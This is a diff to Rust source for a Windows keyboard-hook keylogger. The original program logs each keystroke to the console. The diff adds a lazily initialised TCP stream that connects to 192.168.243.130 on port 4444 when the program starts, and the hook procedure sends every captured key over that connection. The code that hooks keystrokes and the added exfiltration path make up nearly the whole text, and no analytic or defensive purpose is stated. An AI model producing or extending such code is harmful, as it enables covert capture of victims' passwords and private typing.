@@ -1,7 +1,14 @@
-use winapi::um::winuser::{CallNextHookEx, SetWindowsHookExA, UnhookWindowsHookEx, KBDLLHOOKSTRUCT, WH_KEYBOARD_LL, WM_KEYDOWN};
-use winapi::um::winuser::{GetMessageW, MSG, TranslateMessage, DispatchMessageW};
-use std::ptr::null_mut;
+use std::net::TcpStream;
+use std::io::prelude::*;
+use std::sync::Mutex;
+use lazy_static::lazy_static;
+use winapi::um::winuser::{CallNextHookEx, SetWindowsHookExA, UnhookWindowsHookEx, KBDLLHOOKSTRUCT, WH_KEYBOARD_LL, WM_KEYDOWN, GetMessageW, MSG, TranslateMessage, DispatchMessageW};
 use std::os::raw::c_int;
+use std::ptr::null_mut;
+
+lazy_static! {
+    static ref TCP_STREAM: Mutex<Option<TcpStream>> = Mutex::new(None);
+}
 
 unsafe extern "system" fn keyboard_hook_proc(n_code: c_int, w_param: usize, l_param: isize) -> isize {
     if n_code >= 0 && w_param == WM_KEYDOWN as usize {
@@ -82,12 +89,32 @@ unsafe extern "system" fn keyboard_hook_proc(n_code: c_int, w_param: usize, l_pa
             _ => "Unknown",
         };
         println!("Key pressed: {}", key);
+
+        // Send the key pressed through the TCP connection
+        let mut stream_lock = TCP_STREAM.lock().unwrap();
+        if let Some(stream) = stream_lock.as_mut() {
+            let message = format!("{} ", key); // Format the key with a newline
+            let _ = stream.write(message.as_bytes()); // Ignore errors in this context
+        }
     }
 
     CallNextHookEx(null_mut(), n_code, w_param, l_param)
 }
 
 fn main() {
+    // Establish TCP connection
+    match TcpStream::connect("192.168.243.130:4444") {
+        Ok(stream) => {
+            let mut tcp_stream = TCP_STREAM.lock().unwrap();
+            *tcp_stream = Some(stream);
+            println!("Successfully connected to the server.");
+        },
+        Err(e) => {
+            eprintln!("Failed to connect to the server: {}", e);
+            return;
+        },
+    }
+
     unsafe {
         let hook = SetWindowsHookExA(WH_KEYBOARD_LL, Some(keyboard_hook_proc), null_mut(), 0);
         if hook.is_null() {
